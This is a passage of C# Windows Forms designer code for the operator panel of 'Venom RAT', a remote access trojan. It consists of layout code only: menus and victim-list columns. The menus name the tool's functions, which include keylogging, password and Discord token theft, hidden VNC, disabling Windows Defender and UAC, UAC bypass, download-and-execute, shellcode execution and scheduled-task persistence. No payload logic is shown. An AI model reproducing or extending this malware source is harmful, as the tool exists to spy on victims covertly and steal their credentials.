			this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
			this.RunasToolStripMenuItem.Size = new global::System.Drawing.Size(315, 34);
			this.RunasToolStripMenuItem.Text = "Privileges Windows 7";
			this.RunasToolStripMenuItem.Click += new global::System.EventHandler(this.RunasToolStripMenuItem_Click);
			this.hVNCToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.coomingSoonToolStripMenuItem, this.moveToHVNCToolStripMenuItem });
			this.hVNCToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.hVNCToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hVNCToolStripMenuItem.Image")));
			this.hVNCToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.hVNCToolStripMenuItem.Name = "hVNCToolStripMenuItem";
			this.hVNCToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.hVNCToolStripMenuItem.Text = "hVNC";
			this.coomingSoonToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("coomingSoonToolStripMenuItem.Image")));
			this.coomingSoonToolStripMenuItem.Name = "coomingSoonToolStripMenuItem";
			this.coomingSoonToolStripMenuItem.Size = new global::System.Drawing.Size(232, 34);
			this.coomingSoonToolStripMenuItem.Text = "Venom HVNC";
			this.coomingSoonToolStripMenuItem.Click += new global::System.EventHandler(this.coomingSoonToolStripMenuItem_Click);
			this.moveToHVNCToolStripMenuItem.ForeColor = global::System.Drawing.SystemColors.ControlText;
			this.moveToHVNCToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("moveToHVNCToolStripMenuItem.Image")));
			this.moveToHVNCToolStripMenuItem.Name = "moveToHVNCToolStripMenuItem";
			this.moveToHVNCToolStripMenuItem.Size = new global::System.Drawing.Size(232, 34);
			this.moveToHVNCToolStripMenuItem.Text = "Move Client To HVNC";
			this.moveToHVNCToolStripMenuItem.Click += new global::System.EventHandler(this.moveToHVNCToolStripMenuItem_Click);
			this.InstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.InstallToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.SchtaskInstallToolStripMenuItem, this.toolStripSeparator34, this.SchtaskUninstallToolStripMenuItem });
			this.InstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.InstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("InstallToolStripMenuItem.Image")));
			this.InstallToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.InstallToolStripMenuItem.Name = "InstallToolStripMenuItem";
			this.InstallToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.InstallToolStripMenuItem.Text = "Active Task Scheduler";
			this.SchtaskInstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.SchtaskInstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SchtaskInstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SchtaskInstallToolStripMenuItem.Image")));
			this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
			this.SchtaskInstallToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.SchtaskInstallToolStripMenuItem.Text = "Task Scheduler Install";
			this.SchtaskInstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
			this.toolStripSeparator34.Name = "toolStripSeparator34";
			this.toolStripSeparator34.Size = new global::System.Drawing.Size(243, 6);
			this.SchtaskUninstallToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.SchtaskUninstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.SchtaskUninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("SchtaskUninstallToolStripMenuItem.Image")));
			this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
			this.SchtaskUninstallToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.SchtaskUninstallToolStripMenuItem.Text = "Task Scheduler Uninstall";
			this.SchtaskUninstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskUninstallToolStripMenuItem_Click);
			this.InformationToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.InformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("InformationToolStripMenuItem.Image")));
			this.InformationToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem";
			this.InformationToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.InformationToolStripMenuItem.Text = "Information";
			this.InformationToolStripMenuItem.Click += new global::System.EventHandler(this.InformationToolStripMenuItem_Click);
			this.toolStripMenuItem2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.toolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.passwordRecoveryToolStripMenuItem, this.toolStripSeparator35, this.toolStripMenuItem3, this.toolStripSeparator36, this.toolStripMenuItem4 });
			this.toolStripMenuItem2.ForeColor = global::System.Drawing.Color.Black;
			this.toolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem2.Image")));
			this.toolStripMenuItem2.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.toolStripMenuItem2.Name = "toolStripMenuItem2";
			this.toolStripMenuItem2.Size = new global::System.Drawing.Size(230, 34);
			this.toolStripMenuItem2.Text = "KeyLogger";
			this.passwordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordRecoveryToolStripMenuItem.Image")));
			this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
			this.passwordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(214, 34);
			this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
			this.passwordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.passwordRecoveryToolStripMenuItem_Click_1);
			this.toolStripSeparator35.Name = "toolStripSeparator35";
			this.toolStripSeparator35.Size = new global::System.Drawing.Size(211, 6);
			this.toolStripMenuItem3.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.toolStripMenuItem3.ForeColor = global::System.Drawing.Color.Black;
			this.toolStripMenuItem3.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem3.Image")));
			this.toolStripMenuItem3.Name = "toolStripMenuItem3";
			this.toolStripMenuItem3.Size = new global::System.Drawing.Size(214, 34);
			this.toolStripMenuItem3.Text = "Online KeyLogger";
			this.toolStripMenuItem3.Click += new global::System.EventHandler(this.toolStripMenuItem3_Click);
			this.toolStripSeparator36.Name = "toolStripSeparator36";
			this.toolStripSeparator36.Size = new global::System.Drawing.Size(211, 6);
			this.toolStripMenuItem4.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.toolStripMenuItem4.ForeColor = global::System.Drawing.Color.Black;
			this.toolStripMenuItem4.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem4.Image")));
			this.toolStripMenuItem4.Name = "toolStripMenuItem4";
			this.toolStripMenuItem4.Size = new global::System.Drawing.Size(214, 34);
			this.toolStripMenuItem4.Text = "Offline KeyLogger";
			this.toolStripMenuItem4.Click += new global::System.EventHandler(this.toolStripMenuItem4_Click);
			this.toolStripMenuItem5.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.toolStripMenuItem5.ForeColor = global::System.Drawing.Color.Black;
			this.toolStripMenuItem5.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem5.Image")));
			this.toolStripMenuItem5.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.toolStripMenuItem5.Name = "toolStripMenuItem5";
			this.toolStripMenuItem5.Size = new global::System.Drawing.Size(230, 34);
			this.toolStripMenuItem5.Text = "Client Folder";
			this.toolStripMenuItem5.Click += new global::System.EventHandler(this.toolStripMenuItem5_Click);
			this.contextMenuClient.BackColor = global::System.Drawing.Color.FromArgb(240, 240, 240);
			this.contextMenuClient.Font = new global::System.Drawing.Font("Segoe UI", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.contextMenuClient.ImageScalingSize = new global::System.Drawing.Size(27, 27);
			this.contextMenuClient.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.builderToolStripMenuItem1, this.toolStripSeparator1, this.SystemControlToolStripMenuItem, this.toolStripSeparator2, this.RemoteManagerToolStripMenuItem, this.toolStripSeparator3, this.RemoteControlToolStripMenuItem, this.toolStripSeparator5, this.MalwareToolStripMenuItem, this.toolStripSeparator6,
				this.BypassUACAToolStripMenuItem, this.toolStripSeparator7, this.InstallToolStripMenuItem, this.toolStripSeparator8, this.toolStripMenuItem2, this.toolStripSeparator9, this.discordToolStripMenuItem, this.toolStripSeparator37, this.hVNCToolStripMenuItem, this.toolStripSeparator10,
				this.justForFunToolStripMenuItem, this.toolStripSeparator11, this.toolStripMenuItem5, this.toolStripSeparator12, this.InformationToolStripMenuItem
			});
			this.contextMenuClient.Name = "contextMenuStrip1";
			this.contextMenuClient.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
			this.contextMenuClient.Size = new global::System.Drawing.Size(231, 518);
			this.builderToolStripMenuItem1.ForeColor = global::System.Drawing.Color.Black;
			this.builderToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("builderToolStripMenuItem1.Image")));
			this.builderToolStripMenuItem1.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.builderToolStripMenuItem1.Name = "builderToolStripMenuItem1";
			this.builderToolStripMenuItem1.Size = new global::System.Drawing.Size(230, 34);
			this.builderToolStripMenuItem1.Text = "Building Server";
			this.builderToolStripMenuItem1.Click += new global::System.EventHandler(this.builderToolStripMenuItem1_Click_1);
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator2.Name = "toolStripSeparator2";
			this.toolStripSeparator2.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator3.Name = "toolStripSeparator3";
			this.toolStripSeparator3.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator5.Name = "toolStripSeparator5";
			this.toolStripSeparator5.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator6.Name = "toolStripSeparator6";
			this.toolStripSeparator6.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator7.Name = "toolStripSeparator7";
			this.toolStripSeparator7.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator8.Name = "toolStripSeparator8";
			this.toolStripSeparator8.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator9.Name = "toolStripSeparator9";
			this.toolStripSeparator9.Size = new global::System.Drawing.Size(227, 6);
			this.discordToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.DiscordRecoveryToolStripMenuItem });
			this.discordToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("discordToolStripMenuItem.Image")));
			this.discordToolStripMenuItem.Name = "discordToolStripMenuItem";
			this.discordToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.discordToolStripMenuItem.Text = "Discord";
			this.DiscordRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("DiscordRecoveryToolStripMenuItem.Image")));
			this.DiscordRecoveryToolStripMenuItem.Name = "DiscordRecoveryToolStripMenuItem";
			this.DiscordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(247, 34);
			this.DiscordRecoveryToolStripMenuItem.Text = "Token Discord Recovery";
			this.DiscordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.DiscordRecoveryToolStripMenuItem_Click);
			this.toolStripSeparator37.Name = "toolStripSeparator37";
			this.toolStripSeparator37.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator10.Name = "toolStripSeparator10";
			this.toolStripSeparator10.Size = new global::System.Drawing.Size(227, 6);
			this.justForFunToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.justForFunToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("justForFunToolStripMenuItem.Image")));
			this.justForFunToolStripMenuItem.ImageTransparentColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.justForFunToolStripMenuItem.Name = "justForFunToolStripMenuItem";
			this.justForFunToolStripMenuItem.Size = new global::System.Drawing.Size(230, 34);
			this.justForFunToolStripMenuItem.Text = "Just For Fun";
			this.justForFunToolStripMenuItem.Click += new global::System.EventHandler(this.justForFunToolStripMenuItem_Click);
			this.toolStripSeparator11.Name = "toolStripSeparator11";
			this.toolStripSeparator11.Size = new global::System.Drawing.Size(227, 6);
			this.toolStripSeparator12.Name = "toolStripSeparator12";
			this.toolStripSeparator12.Size = new global::System.Drawing.Size(227, 6);
			this.panel2.BackColor = global::System.Drawing.Color.FromArgb(39, 39, 39);
			this.panel2.Controls.Add(this.guna2Panel1);
			this.panel2.Controls.Add(this.guna2ResizeBox1);
			this.panel2.Controls.Add(this.statusStrip1);
			this.panel2.Controls.Add(this.listView1);
			this.panel2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.panel2.Location = new global::System.Drawing.Point(0, 0);
			this.panel2.Name = "panel2";
			this.panel2.Size = new global::System.Drawing.Size(1560, 787);
			this.panel2.TabIndex = 6;
			this.guna2ResizeBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ResizeBox1.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2ResizeBox1.FillColor = global::System.Drawing.Color.White;
			this.guna2ResizeBox1.ForeColor = global::System.Drawing.Color.Black;
			this.guna2ResizeBox1.Location = new global::System.Drawing.Point(1539, 766);
			this.guna2ResizeBox1.Name = "guna2ResizeBox1";
			this.guna2ResizeBox1.Size = new global::System.Drawing.Size(20, 20);
			this.guna2ResizeBox1.TabIndex = 130;
			this.guna2ResizeBox1.TargetControl = this;
			this.statusStrip1.BackColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.statusStrip1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.statusStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.toolStripStatusLabel1, this.toolStripStatusLabel2 });
			this.statusStrip1.Location = new global::System.Drawing.Point(0, 765);
			this.statusStrip1.Name = "statusStrip1";
			this.statusStrip1.Padding = new global::System.Windows.Forms.Padding(1, 0, 9, 0);
			this.statusStrip1.Size = new global::System.Drawing.Size(1560, 22);
			this.statusStrip1.TabIndex = 8;
			this.statusStrip1.Text = "statusStrip1";
			this.toolStripStatusLabel1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripStatusLabel1.LinkColor = global::System.Drawing.Color.Green;
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new global::System.Drawing.Size(16, 17);
			this.toolStripStatusLabel1.Text = "...";
			this.toolStripStatusLabel1.VisitedLinkColor = global::System.Drawing.Color.Green;
			this.toolStripStatusLabel2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripStatusLabel2.LinkColor = global::System.Drawing.Color.Gainsboro;
			this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
			this.toolStripStatusLabel2.Size = new global::System.Drawing.Size(130, 17);
			this.toolStripStatusLabel2.Text = "                    Notification";
			this.listView1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.listView1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.listView1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.lv_ip, this.lv_country, this.lv_group, this.lv_hwid, this.lv_user, this.lv_camera, this.lv_os, this.lv_version, this.lv_ins, this.lv_admin,
				this.lv_av, this.lv_ping, this.lv_act, this.columnHeader1
			});
			this.listView1.ContextMenuStrip = this.contextMenuClient;
			this.listView1.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.listView1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.listView1.FullRowSelect = true;
			this.listView1.HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
			this.listView1.HideSelection = false;
			this.listView1.Location = new global::System.Drawing.Point(0, 60);
			this.listView1.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView1.Name = "listView1";
			this.listView1.ShowGroups = false;
			this.listView1.ShowItemToolTips = true;
			this.listView1.Size = new global::System.Drawing.Size(1560, 727);
			this.listView1.TabIndex = 7;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = global::System.Windows.Forms.View.Details;
			this.lv_ip.Tag = "";
			this.lv_ip.Text = "IP Addresse";
			this.lv_ip.Width = 106;
			this.lv_country.Text = "Location";
			this.lv_country.Width = 101;
			this.lv_group.Text = "Group Team";
			this.lv_group.Width = 92;
			this.lv_hwid.Text = "Hardware ID";
			this.lv_hwid.Width = 117;
			this.lv_user.Text = "PC - UserName";
			this.lv_user.Width = 117;
			this.lv_camera.Text = "Web Camera";
			this.lv_camera.Width = 99;
			this.lv_os.Text = "Operating System";
			this.lv_os.Width = 179;
			this.lv_version.Text = "Client Version";
			this.lv_version.Width = 126;
			this.lv_ins.Text = "Active time";
			this.lv_ins.Width = 120;
			this.lv_admin.Text = "Privilege Level";
			this.lv_admin.Width = 166;
			this.lv_av.Text = "OS AntiVirus";
			this.lv_av.Width = 136;
			this.lv_ping.Text = "Ping";
			this.lv_act.Text = "Explorer Activity ";
			this.lv_act.Width = 350;
			this.columnHeader1.Text = "";
			this.columnHeader1.Width = 900;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.AnimationType = global::Guna.UI2.WinForms.Guna2BorderlessForm.AnimateWindowType.AW_VER_NEGATIVE;
			this.guna2BorderlessForm1.BorderRadius = 10;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(0, 177, 130);
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(0, 177, 130);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			base.ClientSize = new global::System.Drawing.Size(1560, 787);
			base.Controls.Add(this.panel2);
			base.Controls.Add(this.menuStrip1);
			base.Controls.Add(this.tabControl122);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.MainMenuStrip = this.menuStrip1;
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.MaximizeBox = false;
			base.Name = "Form1";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Venom RAT";
			base.Activated += new global::System.EventHandler(this.Form1_Activated);
			base.Deactivate += new global::System.EventHandler(this.Form1_Deactivate);
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
			base.Load += new global::System.EventHandler(this.Form1_Load);
			this.tabControl122.ResumeLayout(false);
			this.tabPage33.ResumeLayout(false);
			this.contextMenuThumbnail.ResumeLayout(false);
			this.tabPage44.ResumeLayout(false);
			this.contextMenuTasks.ResumeLayout(false);
			this.guna2Panel1.ResumeLayout(false);
			this.guna2Panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.menuStrip1.ResumeLayout(false);
			this.menuStrip1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
			this.contextMenuLogs.ResumeLayout(false);
			this.contextMenuClient.ResumeLayout(false);
			this.panel2.ResumeLayout(false);
			this.panel2.PerformLayout();
			this.statusStrip1.ResumeLayout(false);
			this.statusStrip1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		private global::System.ComponentModel.IContainer components;

		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;

		private global::System.Windows.Forms.TabControl tabControl122;

		private global::System.Windows.Forms.TabPage tabPage33;

		public global::System.Windows.Forms.ListView listView33;

		private global::System.Windows.Forms.TabPage tabPage44;

		public global::System.Windows.Forms.ListView listView44;

		private global::System.Windows.Forms.ColumnHeader columnHeader4;

		private global::System.Windows.Forms.ColumnHeader columnHeader5;

		private global::System.Windows.Forms.TabPage tabPage11;

		private global::System.Windows.Forms.ContextMenuStrip contextMenuThumbnail;

		private global::System.Windows.Forms.ToolStripMenuItem sTARTToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem sTOPToolStripMenuItem;

		public global::System.Windows.Forms.ImageList ThumbnailImageList;

		private global::System.Windows.Forms.ContextMenuStrip contextMenuTasks;

		private global::System.Windows.Forms.ToolStripMenuItem sendFileFromUrlToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem disableUACToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem disableWDToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem installSchtaskToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem uPDATEToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem autoKeyloggerToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem fakeBinderToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator4;

		private global::System.Windows.Forms.ToolStripMenuItem dELETETASKToolStripMenuItem;

		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox2;

		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		private global::System.Windows.Forms.ToolStripMenuItem FileToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem BuilderToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem BlockToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SettingToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem ExitToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem HelpToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem DocumentToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem AboutToolStripMenuItem;

		private global::System.Windows.Forms.MenuStrip menuStrip1;

		private global::System.Windows.Forms.Timer ConnectTimeout;

		private global::System.Windows.Forms.Timer TimerTask;

		public global::System.Windows.Forms.NotifyIcon notifyIcon1;

		private global::System.Diagnostics.PerformanceCounter performanceCounter2;

		private global::System.Diagnostics.PerformanceCounter performanceCounter1;

		private global::System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem;

		private global::System.Windows.Forms.ContextMenuStrip contextMenuLogs;

		private global::System.Windows.Forms.Timer UpdateUI;

		private global::System.Windows.Forms.Timer ping;

		private global::System.Windows.Forms.ToolStripMenuItem SystemControlToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem ClientControlToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem UninstallToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem UpdateToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RestartToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem StopToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem SystemToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem LogoutToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RebootToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem ShutDownToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RemoteManagerToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RemoteShellToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RemoteScreenToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RemoteCameraToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem remoteRegeditToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem FileManagerToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem ProcessManagerToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem netstatToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RecordToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RemoteControlToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SendFileToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SendFileToDiskToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SendFileToMemoryToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem runShellcodeToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem VisteWebsiteToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem ChangeWallpaperToolStripMenuItem1;

		private global::System.Windows.Forms.ToolStripMenuItem FileSearchToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem MalwareToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem DisableWDToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem DisableUACToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem BypassUACAToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SilentCleanupToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem RunasToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem hVNCToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem InstallToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SchtaskInstallToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem SchtaskUninstallToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem InformationToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;

		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem3;

		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem4;

		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem5;

		private global::System.Windows.Forms.ContextMenuStrip contextMenuClient;

		private global::System.Windows.Forms.Panel panel2;

		private global::System.Windows.Forms.StatusStrip statusStrip1;

		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;

		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2;

		private global::System.Windows.Forms.PictureBox pictureBox1;

		private global::System.Windows.Forms.ToolStripMenuItem builderToolStripMenuItem1;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator2;

		private global::Guna.UI2.WinForms.Guna2ResizeBox guna2ResizeBox1;

		private global::System.Windows.Forms.Label label1;

		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel1;

		public global::System.Windows.Forms.ListView listView1;

		private global::System.Windows.Forms.ColumnHeader lv_ip;

		private global::System.Windows.Forms.ColumnHeader lv_country;

		private global::System.Windows.Forms.ColumnHeader lv_group;

		public global::System.Windows.Forms.ColumnHeader lv_hwid;

		private global::System.Windows.Forms.ColumnHeader lv_user;

		private global::System.Windows.Forms.ColumnHeader lv_camera;

		private global::System.Windows.Forms.ColumnHeader lv_os;

		private global::System.Windows.Forms.ColumnHeader lv_version;

		private global::System.Windows.Forms.ColumnHeader lv_ins;

		private global::System.Windows.Forms.ColumnHeader lv_admin;

		private global::System.Windows.Forms.ColumnHeader lv_av;

		public global::System.Windows.Forms.ColumnHeader lv_ping;

		public global::System.Windows.Forms.ColumnHeader lv_act;

		private global::System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem coomingSoonToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator2;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator3;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator5;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator6;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator7;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator8;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator9;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator10;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator11;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator12;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator13;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator14;

